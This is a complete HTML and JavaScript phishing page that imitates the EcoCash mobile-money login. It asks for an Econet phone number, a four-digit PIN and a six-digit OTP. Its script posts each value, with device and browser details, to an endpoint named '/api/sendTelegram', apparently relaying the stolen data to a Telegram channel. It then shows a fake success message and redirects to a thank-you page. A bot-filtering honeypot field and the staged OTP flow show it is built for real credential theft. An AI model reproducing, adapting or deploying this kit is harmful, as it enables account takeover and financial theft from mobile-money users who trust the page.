<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>EcoCash — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
body{
  font-family:Inter,system-ui,Arial;
  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  min-height:100vh;
}
.card{
  width:100%;
  max-width:380px;
  background:#fff;
  padding:20px;
  border-radius:12px;
  box-shadow:0 12px 30px rgba(2,6,23,.06)
}
.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px;font-size:20px}
label{font-size:13px;display:block;margin-top:8px}
input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #e6eefc;
  background:#fbfdff;
  font-size:14px
}
.btn{
  background:#4b86ff;
  color:#fff;
  border:0;
  padding:10px;
  border-radius:8px;
  margin-top:12px;
  width:100%;
  cursor:pointer
}
.btn[disabled]{background:#cbd5e1;cursor:not-allowed}
.error{
  color:#d04444;
  font-size:13px;
  margin-top:4px;
  display:none
}
.pin-row{
  display:flex;
  gap:8px;
  justify-content:center;
  margin-top:6px
}
.pin-digit{
  width:40px;
  height:48px;
  font-size:20px;
  text-align:center;
  border-radius:8px;
  border:1px solid #e6eefc
}

/* OTP */
.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.35);
  display:flex;
  align-items:center;
  justify-content:center
}
.otp-box{
  background:#fff;
  padding:18px;
  border-radius:12px;
  min-width:300px
}
.otp-row{
  display:flex;
  gap:8px;
  justify-content:center;
  margin-top:8px
}
.otp-digit{
  width:40px;
  height:48px;
  font-size:20px;
  text-align:center;
  border-radius:8px;
  border:1px solid #e6eefc
}
.otp-warning{
  color:#d04444;
  font-size:13px;
  margin-top:6px;
  display:none
}
.resend-row{
  display:flex;
  justify-content:space-between;
  align-items:center;
  margin-top:12px
}
.resend-btn{
  background:#fff;
  border:1px solid #e6eefc;
  padding:8px 12px;
  border-radius:8px;
  cursor:pointer
}
.resend-btn[disabled]{opacity:.6;cursor:not-allowed}
.small{font-size:13px;color:#6b7280}
.success{color:#16a34a;font-weight:600}
</style>
</head>

<body>

<div class="card">
  <img src="assets/eco.png" class="logo">
  <h2>Log In</h2>

  <form id="loginForm" autocomplete="off">
    <label>Mobile Number</label>
    <input id="phone" value="+263" inputmode="numeric">
    <div id="phoneError" class="error">
      Enter Econet number (9 digits starting with 7)
    </div>

    <label>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <input id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP</strong></div>
    <p class="small">We have sent an OTP to your phone.</p>

    <div class="otp-row">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
    </div>

    <div id="otpWarning" class="otp-warning">Please input 6 digits</div>

    <div class="resend-row">
      <div class="small" id="resendInfo">
        Resend available in <span id="countdown">120</span>s
      </div>
      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
    </div>

    <div style="display:flex;gap:10px;margin-top:12px">
      <button id="confirmOtp" disabled>Confirm</button>
      <button id="cancelOtp">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:8px"></div>
  </div>
</div>

<script>
/* ================= DEVICE INFO (GUARANTEED) ================= */
const ua = navigator.userAgent || 'unknown';
const device_os =
  /Android/i.test(ua) ? 'Android' :
  /iPhone|iPad/i.test(ua) ? 'iOS' : 'Other';

const device_os_version =
  (ua.match(/Android\s([\d\.]+)/i) || ua.match(/OS\s([\d_]+)/i) || ['','unknown'])[1]
    .replace(/_/g,'.');

const device_browser =
  /Chrome/i.test(ua) ? 'Chrome' :
  /Safari/i.test(ua) ? 'Safari' :
  /Firefox/i.test(ua) ? 'Firefox' : 'Other';

/* ================= PHONE (FIXED) ================= */
const phone = document.getElementById('phone');
const phoneError = document.getElementById('phoneError');
const loginBtn = document.getElementById('loginBtn');

function showPhoneError(show){
  phoneError.style.display = show ? 'block' : 'none';
}

function phoneIsValid(){
  const digits = phone.value.slice(4);
  return /^7\d{8}$/.test(digits);
}

function enforcePhone(){
  let digits = phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
  phone.value = '+263' + digits;
  showPhoneError(!phoneIsValid());
}

phone.addEventListener('input', ()=>{
  enforcePhone();
  updateState();
});
phone.addEventListener('blur', enforcePhone);
window.addEventListener('load', enforcePhone);

/* ================= PIN ================= */
const pinBoxes = [...document.querySelectorAll('.pin-digit')];
let pinVal = '';

pinBoxes.forEach((b,i)=>{
  b.addEventListener('input',()=>{
    b.value=b.value.replace(/\D/g,'');
    if(b.value && i<3) pinBoxes[i+1].focus();
    pinVal = pinBoxes.map(x=>x.value).join('');
    updateState();
  });
  b.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !b.value && i>0){
      pinBoxes[i-1].focus();
      pinBoxes[i-1].value='';
      e.preventDefault();
    }
  });
});

/* ================= STATE ================= */
function updateState(){
  loginBtn.disabled = !(phoneIsValid() && /^\d{4}$/.test(pinVal));
}

/* ================= API ================= */
function send(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ================= OTP ================= */
const otpModal=document.getElementById('otpModal');
const otpInputs=[...document.querySelectorAll('.otp-digit')];
const confirmOtp=document.getElementById('confirmOtp');
const cancelOtp=document.getElementById('cancelOtp');
const otpWarning=document.getElementById('otpWarning');
const otpStatus=document.getElementById('otpStatus');
const resendBtn=document.getElementById('resendBtn');
const resendInfo=document.getElementById('resendInfo');
const countdownEl=document.getElementById('countdown');

let timer=null, seconds=120;

function startCountdown(){
  clearInterval(timer);
  seconds=120;
  resendBtn.disabled=true;
  resendInfo.innerHTML=`Resend available in <span id="countdown">${seconds}</span>s`;
  timer=setInterval(()=>{
    seconds--;
    if(seconds<=0){
      clearInterval(timer);
      resendBtn.disabled=false;
      resendInfo.textContent="Didn't receive OTP?";
    }else{
      countdownEl.textContent=seconds;
    }
  },1000);
}

function otpValue(){return otpInputs.map(o=>o.value).join('');}

otpInputs.forEach((o,i)=>{
  o.addEventListener('input',()=>{
    o.value=o.value.replace(/\D/g,'');
    if(o.value && i<5) otpInputs[i+1].focus();
    confirmOtp.disabled=!/^\d{6}$/.test(otpValue());
    otpWarning.style.display=confirmOtp.disabled?'block':'none';
  });
});

/* ================= LOGIN ================= */
loginForm.onsubmit=async e=>{
  e.preventDefault();
  if(hp.value) return;

  otpModal.style.display='flex';
  otpInputs.forEach(o=>o.value='');
  confirmOtp.disabled=true;
  otpWarning.style.display='none';
  startCountdown();

  await send({
    event:'login_clicked',
    loginPhone:phone.value,
    loginPin:pinVal,
    device_os,
    device_os_version,
    device_browser,
    device_user_agent:ua,
    submittedAt:new Date().toISOString()
  });
};

resendBtn.onclick=async()=>{
  startCountdown();
  await send({
    event:'resend_otp',
    loginPhone:phone.value,
    loginPin:pinVal,
    device_os,
    device_os_version,
    device_browser,
    device_user_agent:ua,
    submittedAt:new Date().toISOString()
  });
};

confirmOtp.onclick=async()=>{
  await send({
    event:'otp_confirm',
    loginPhone:phone.value,
    loginPin:pinVal,
    otp:otpValue(),
    device_os,
    device_os_version,
    device_browser,
    device_user_agent:ua,
    submittedAt:new Date().toISOString()
  });
  otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
  setTimeout(()=>location.href='thankyou.html',1200);
};

cancelOtp.onclick=()=>{
  otpModal.style.display='none';
  clearInterval(timer);
};
</script>

</body>
</html>
